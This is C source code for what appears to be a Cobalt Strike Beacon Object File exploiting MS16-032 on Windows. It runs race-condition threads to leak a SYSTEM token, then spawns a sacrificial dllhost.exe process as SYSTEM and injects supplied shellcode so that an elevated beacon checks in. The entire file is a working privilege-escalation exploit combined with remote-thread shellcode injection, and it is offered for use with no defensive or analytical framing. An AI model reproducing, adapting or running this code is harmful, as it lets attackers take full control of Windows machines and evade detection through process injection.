#include <windows.h>
#include "beacon.h"

#ifndef NTSTATUS
#define NTSTATUS LONG
#endif

typedef NTSTATUS (WINAPI* _NtQuerySystemInformation)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;

typedef struct {
    HANDLE hThread;
    LPWSTR lpCommandLine;
} RACE_THREAD_DATA;

/* String comparison helper */
int my_wcsstr(LPWSTR haystack, LPWSTR needle) {
    int i, j;
    for (i = 0; haystack[i] != L'\0'; i++) {
        for (j = 0; needle[j] != L'\0'; j++) {
            if (haystack[i + j] != needle[j])
                break;
        }
        if (needle[j] == L'\0')
            return 1;
    }
    return 0;
}

DWORD WINAPI RaceThread(LPVOID lpParam) {
    RACE_THREAD_DATA* pData = (RACE_THREAD_DATA*)lpParam;
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    int i;

    MSVCRT$memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    
    for (i = 0; i < 100; i++) {
        MSVCRT$memset(&pi, 0, sizeof(pi));
        
        ADVAPI32$CreateProcessWithLogonW(
            L"dummy",
            L"dummy", 
            L"dummy",
            LOGON_NETCREDENTIALS_ONLY,
            NULL,
            pData->lpCommandLine,
            CREATE_SUSPENDED,
            NULL,
            NULL,
            &si,
            &pi
        );
        
        if (pi.hProcess) {
            KERNEL32$TerminateProcess(pi.hProcess, 0);
            KERNEL32$CloseHandle(pi.hProcess);
            KERNEL32$CloseHandle(pi.hThread);
        }
    }
    
    return 0;
}

HANDLE FindSystemTokenHandle() {
    HMODULE hNtdll = KERNEL32$GetModuleHandleA("ntdll.dll");
    _NtQuerySystemInformation NtQuerySystemInformation = 
        (_NtQuerySystemInformation)KERNEL32$GetProcAddress(hNtdll, "NtQuerySystemInformation");
    
    if (!NtQuerySystemInformation) return NULL;

    ULONG size = 0x10000;
    PSYSTEM_HANDLE_INFORMATION pHandleInfo = NULL;
    NTSTATUS status;
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    ULONG i;

    do {
        pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)KERNEL32$HeapAlloc(hHeap, 0, size);
        status = NtQuerySystemInformation(16, pHandleInfo, size, &size);
        
        if (status == 0xC0000004) {
            KERNEL32$HeapFree(hHeap, 0, pHandleInfo);
            size += 0x10000;
        }
    } while (status == 0xC0000004);

    if (status != 0) {
        if (pHandleInfo) KERNEL32$HeapFree(hHeap, 0, pHandleInfo);
        return NULL;
    }

    HANDLE hToken = NULL;
    DWORD currentPid = KERNEL32$GetCurrentProcessId();

    for (i = 0; i < pHandleInfo->NumberOfHandles; i++) {
        if (pHandleInfo->Handles[i].UniqueProcessId == currentPid &&
            pHandleInfo->Handles[i].ObjectTypeIndex == 5) {
            
            HANDLE hDup = NULL;
            if (KERNEL32$DuplicateHandle(
                KERNEL32$GetCurrentProcess(),
                (HANDLE)(ULONG_PTR)pHandleInfo->Handles[i].HandleValue,
                KERNEL32$GetCurrentProcess(),
                &hDup,
                TOKEN_ALL_ACCESS,
                FALSE,
                0)) {
                
                TOKEN_TYPE tokenType;
                DWORD retLen;
                if (ADVAPI32$GetTokenInformation(hDup, TokenType, &tokenType, sizeof(tokenType), &retLen)) {
                    if (tokenType == TokenPrimary) {
                        BYTE buffer[512];
                        if (ADVAPI32$GetTokenInformation(hDup, TokenUser, buffer, sizeof(buffer), &retLen)) {
                            TOKEN_USER* pTokenUser = (TOKEN_USER*)buffer;
                            LPWSTR sidString;
                            ADVAPI32$ConvertSidToStringSidW(pTokenUser->User.Sid, &sidString);
                            
                            if (my_wcsstr(sidString, L"S-1-5-18")) {
                                KERNEL32$LocalFree(sidString);
                                hToken = hDup;
                                break;
                            }
                            KERNEL32$LocalFree(sidString);
                        }
                    }
                }
                
                if (hToken != hDup) KERNEL32$CloseHandle(hDup);
            }
        }
    }

    KERNEL32$HeapFree(hHeap, 0, pHandleInfo);
    return hToken;
}

BOOL InjectShellcode(HANDLE hSystemToken, unsigned char* shellcode, int shellcodeLen) {
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    LPVOID pRemoteCode;
    SIZE_T bytesWritten;
    HANDLE hThread;
    wchar_t target[] = L"C:\\Windows\\System32\\dllhost.exe";

    MSVCRT$memset(&si, 0, sizeof(si));
    MSVCRT$memset(&pi, 0, sizeof(pi));
    si.cb = sizeof(si);

    if (!ADVAPI32$CreateProcessAsUserW(
        hSystemToken,
        NULL,
        target,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi)) {
        
        BeaconPrintf(CALLBACK_ERROR, "[-] CreateProcessAsUser failed: %d", KERNEL32$GetLastError());
        return FALSE;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Spawned sacrificial process with PID: %d", pi.dwProcessId);

    pRemoteCode = KERNEL32$VirtualAllocEx(
        pi.hProcess,
        NULL,
        shellcodeLen,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!pRemoteCode) {
        BeaconPrintf(CALLBACK_ERROR, "[-] VirtualAllocEx failed: %d", KERNEL32$GetLastError());
        KERNEL32$TerminateProcess(pi.hProcess, 0);
        KERNEL32$CloseHandle(pi.hProcess);
        KERNEL32$CloseHandle(pi.hThread);
        return FALSE;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Allocated memory at 0x%p", pRemoteCode);

    if (!KERNEL32$WriteProcessMemory(
        pi.hProcess,
        pRemoteCode,
        shellcode,
        shellcodeLen,
        &bytesWritten)) {
        
        BeaconPrintf(CALLBACK_ERROR, "[-] WriteProcessMemory failed: %d", KERNEL32$GetLastError());
        KERNEL32$VirtualFreeEx(pi.hProcess, pRemoteCode, 0, MEM_RELEASE);
        KERNEL32$TerminateProcess(pi.hProcess, 0);
        KERNEL32$CloseHandle(pi.hProcess);
        KERNEL32$CloseHandle(pi.hThread);
        return FALSE;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Wrote %d bytes of shellcode", bytesWritten);

    hThread = KERNEL32$CreateRemoteThread(
        pi.hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)pRemoteCode,
        NULL,
        0,
        NULL
    );

    if (!hThread) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CreateRemoteThread failed: %d", KERNEL32$GetLastError());
        KERNEL32$VirtualFreeEx(pi.hProcess, pRemoteCode, 0, MEM_RELEASE);
        KERNEL32$TerminateProcess(pi.hProcess, 0);
        KERNEL32$CloseHandle(pi.hProcess);
        KERNEL32$CloseHandle(pi.hThread);
        return FALSE;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Shellcode injected successfully!");
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Your elevated beacon should check in shortly");

    KERNEL32$CloseHandle(hThread);
    KERNEL32$CloseHandle(pi.hProcess);
    KERNEL32$CloseHandle(pi.hThread);

    return TRUE;
}

void go(char* args, int len) {
    datap parser;
    int shellcodeLen;
    unsigned char* shellcode;
    HANDLE hThreads[5];
    RACE_THREAD_DATA threadData;
    HANDLE hSystemToken;
    int i;

    BeaconDataParse(&parser, args, len);
    shellcodeLen = BeaconDataLength(&parser);
    shellcode = (unsigned char*)BeaconDataExtract(&parser, NULL);

    if (!shellcode || shellcodeLen == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] No shellcode provided");
        BeaconPrintf(CALLBACK_ERROR, "Usage: ms16032_inject");
        BeaconPrintf(CALLBACK_ERROR, "This will automatically inject beacon shellcode as SYSTEM");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] MS16-032 Local Privilege Escalation with Beacon Injection");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Shellcode size: %d bytes", shellcodeLen);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Starting race condition threads...");

    threadData.lpCommandLine = L"C:\\Windows\\System32\\cmd.exe";

    for (i = 0; i < 5; i++) {
        hThreads[i] = KERNEL32$CreateThread(NULL, 0, RaceThread, &threadData, 0, NULL);
    }

    KERNEL32$Sleep(500);

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Searching for leaked SYSTEM token...");
    hSystemToken = FindSystemTokenHandle();

    for (i = 0; i < 5; i++) {
        KERNEL32$TerminateThread(hThreads[i], 0);
        KERNEL32$CloseHandle(hThreads[i]);
    }

    if (!hSystemToken) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to find SYSTEM token. Exploit may have failed.");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Found SYSTEM token!");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Injecting beacon shellcode...");

    if (InjectShellcode(hSystemToken, shellcode, shellcodeLen)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Exploit completed successfully!");
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[-] Shellcode injection failed");
    }

    KERNEL32$CloseHandle(hSystemToken);
}
